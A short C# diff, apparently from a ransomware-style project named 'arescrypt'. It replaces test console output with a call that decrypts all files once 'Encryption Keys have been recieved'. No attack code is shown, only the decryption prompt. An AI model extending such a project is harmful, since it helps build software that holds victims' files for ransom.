@@ -127,12 +127,12 @@ namespace arescrypt
                 var confirm = MessageBox.Show("Would you like to launch decryption?", "Encryption Keys have been recieved.", MessageBoxButtons.YesNo);
                 if (confirm == DialogResult.Yes)
                 {
-                    CryptoDisplay cd = new CryptoDisplay();
+                    Queue que = new Queue();
+                    que.DecryptAllFiles();
 
-                    cd.addLineToConsole("testing...");
-                    cd.addLineToConsole("hello world...");
-                    
-                    cd.ShowDialog(this);
+                    // waiting for decryption to complete...
+
+                    MessageBox.Show("Decryption complete!");
                 }
             }
             else
